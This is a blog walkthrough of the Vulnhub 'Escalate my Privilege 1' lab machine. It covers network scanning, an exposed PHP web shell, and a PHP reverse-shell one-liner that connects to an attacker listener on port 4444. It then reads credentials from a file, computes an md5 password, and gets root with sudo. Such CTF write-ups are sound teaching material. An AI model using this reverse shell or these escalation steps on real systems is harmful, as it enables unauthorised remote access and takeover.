---
layout: post
title:  "Escalate my Privilege 1"
date:  2020-04-10 16:03:36 +0530
categories: Vulnhub_CTF
tags: Writeup Walkthrough
---
Hello all, Today we will see a walkthrough on “escalate my privilege” machine from vulnhub.

According to the author this box is specially made for learning and sharpening Linux Privilege Escalation skills.

The difficulty of this machine is set to Easy / Beginner Level. You can download the machine from https://www.vulnhub.com/series/escalate-my-privileges,291/.

**Testing Methodology:**

**Network Scanning:**

Let us scan for the local N/W and identify the IP address of the machine using netdiscover.

![netdiscover](/images/emp1_1.png)
![netdiscover](/images/emp1_2.png)

Post identifying the IP our next step will be to identifying the running ports and servers using Nmap.

![netdiscover](/images/emp1_3.png)


**Enumeration:**

Within the Nmap scan, we can identify that there is a page called /phpbash.php

So I went ahead to the URL http://192.168.0.180/phpbash.php and could see the bash terminal. And I ran the id command which gives user-id Apache in the output.

  ![netdiscover](/images/emp1_4.png)

Post that I went ahead with a PHP reverse shell and Netcat listener on port **4444**.

*Netcat command: __nc -lvp 4444.__*

*PHP reverse shell:__php -r $sock=fsockopen(“192.168.0.195”,4444);exec(“/bin/sh -i <&3 >&3 2>&3”);’__*

  ![netdiscover](/images/emp1_5.png)

After getting the reverse shell from the machine, on listing the directory found readme.txt file and reading it revealed the username Armour.

I went ahead and looked into the /home directory of the user armour and found Credentials.txt file.

On reading the file using cat command it displayed a message “ my password is md5(rootroot1)”.

  ![netdiscover](/images/emp1_6.png)

Probably the password to login to armour user would be md5 hash of “rootroot1”.

I opened up a new terminal and using the __*echo -n “rootroot1” | md5sum*__ command got the md5 of
__“rootroot1”:b7bc8489abe360486b4b19dbc242e885.__

__Privilege Escalation:__

Using the hash generated I was able to successfully log in to armour using switch user. Which gave a blank shell and had to break it using python TTY command.

__python3 -c ‘import pty;pty.spawn(“/bin/bash”)’__

  ![netdiscover](/images/emp1_7.png)


Post that I ran __*“sudo -l”*__ command to see if there is any sudoer file entry and could identify there well a lot of it. And as mentioned earlier there are several ways to do privilege escalation on this machine.

  ![netdiscover](/images/emp1_8.png)

Given that, I used the command __*“sudo /bin/bash”*__ which gave me the root shell and found the flag “proof.txt” under the root directory.

  ![netdiscover](/images/emp1_9.png)

And that’s it, this concludes the walkthrough, thank you.
